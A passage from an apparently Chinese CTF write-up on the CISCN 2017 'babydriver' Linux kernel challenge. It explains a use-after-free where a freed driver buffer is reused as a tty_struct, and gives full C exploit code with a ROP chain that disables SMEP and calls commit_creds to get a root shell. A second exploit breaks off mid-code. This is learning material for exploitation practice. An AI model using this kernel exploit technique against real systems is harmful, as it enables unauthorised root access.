Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>    </p></details><p><code>struct tty_operations</code></p><details>    <summary>struct tty_operations</summary>    <p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>    </p></details><p>可以看到<code>tty_struct</code>结构偏移24的地方存放了一个<code>tty_operations</code>结构的指针，这个<code>tty_operations</code>结构都是对tty进行操作的函数指针，可以控制<code>ops</code>指针指向我们可以控制的区域。显然一次函数调用，我们能干的事情很少，所以就使用这一次调用执行stack pivot，ROP来获得持续的控制。</p><p>这里使用write函数调用，在执行到write时，可以发现此时rax指向<code>tty_operations</code>的首地址，所以先在operations中构造rop。（在V1NKe师傅的<a href="https://xz.aliyun.com/t/4529#toc-4">文章</a>中可以发现write是通过<code>call [rax+0x38]</code>调用的。如果一开始，应该怎样找到这个断点地址？[todolist1] &lt;已解决&gt;）</p><p>使用<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本解压得到内核镜像，再通过ROPgadget或者Ropper获得gadgets。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./extract-vmlinux bzImage &gt; vmlinux</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary vmlinux &gt; gadgets</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary vmlinux --opcode 48cf  <span class="comment"># search for iretq</span></span></span><br></pre></td></tr></table></figure><p>利用流程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 两次打开&#x2F;dev&#x2F;babydev设备，ioctl该设备buf为0x2e0   # sizeof(struct tty_struct) &#x3D; 0x2e0</span><br><span class="line">2. 在tty_operations上布置rop</span><br><span class="line">3. 关闭一个babydev，会将buf释放一次，造成UAF</span><br><span class="line">4. open(&quot;&#x2F;dev&#x2F;ptmx&quot;, O_RDWR|O_NOCTTY)将使用刚释放的0x2e0空间存储tty_struct</span><br><span class="line">5. 改写tty_struct</span><br><span class="line">6. write触发</span><br></pre></td></tr></table></figure><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp2.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">uint64_t</span> rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">int</span> (*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xffffffff810a1420</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %cs, tf+8;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq; popq tf+16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %rsp, tf+24;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %ss, tf+32;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Status saved!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_root</span><span class="params">()</span>        <span class="comment">// 如果不加返回值，这个函数会被编译成不返回</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> fake_tty_operations[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> fake_tty[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint64_t</span> rop[<span class="number">30</span>] = &#123;</span><br><span class="line">        <span class="number">0xffffffff810d238d</span>,         <span class="comment">// pop rdi ; ret 关闭SMEP</span></span><br><span class="line">        <span class="number">0x6f0</span>,</span><br><span class="line">        <span class="number">0xffffffff81004d80</span>,         <span class="comment">// mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        get_root,</span><br><span class="line">        <span class="number">0xffffffff81063694</span>,         <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0xffffffff814ee0a4</span>,         <span class="comment">// opcode: 48 cf iretq</span></span><br><span class="line">    &#125;;</span><br><span class="line">    tf.rip = get_shell;</span><br><span class="line">    *(struct trap_frame*)(&amp;rop[<span class="number">8</span>]) = tf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; ++i) &#123;</span><br><span class="line">        fake_tty_operations[i] = <span class="number">0xFFFFFFFF8181BFC5</span>;            </span><br><span class="line">        <span class="comment">// 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e </span></span><br><span class="line">        <span class="comment">// 0xffffffff8181bf7e: ret</span></span><br><span class="line">        <span class="comment">// 这个gadget，ROPgadget搜索结果错误，详见ERROR节</span></span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff8100ce6e</span>;                <span class="comment">// pop rax; ret</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = rop;</span><br><span class="line">    fake_tty_operations[<span class="number">2</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>;                </span><br><span class="line">    <span class="comment">// 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e </span></span><br><span class="line">    <span class="comment">// 0xffffffff8181bf7e: ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">32</span>);</span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_tty_operations;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="exploit3"><a href="#exploit3" class="headerlink" title="exploit3"></a>exploit3</h4><p>exp3和exp2很像，差别在于使用了ioctl触发的<code>tty_operations</code>。与write不同，调用ioctl是用的<code>call rax</code>，所以rax中所存储的就是ioctl函数的地址。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp3.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflag;</span><br><span class="line">    <span class="keyword">uint64_t</span> rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>) (<span class="title">struct</span> <span class="title">tty_driver</span> * <span class="title">driver</span>,</span></span><br><span class="line"><span class="class">  <span class="title">struct</span> <span class="title">file</span> * <span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver * driver, struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver * driver, struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct * tty,</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct * tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct * tty,</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct * tty,</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct * tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct * tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct * tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct * tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct * tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct * tty, struct winsize * ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct * tty, struct termiox * tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct * tty,</span><br><span class="line">      struct serial_icounter_struct * icount);</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* 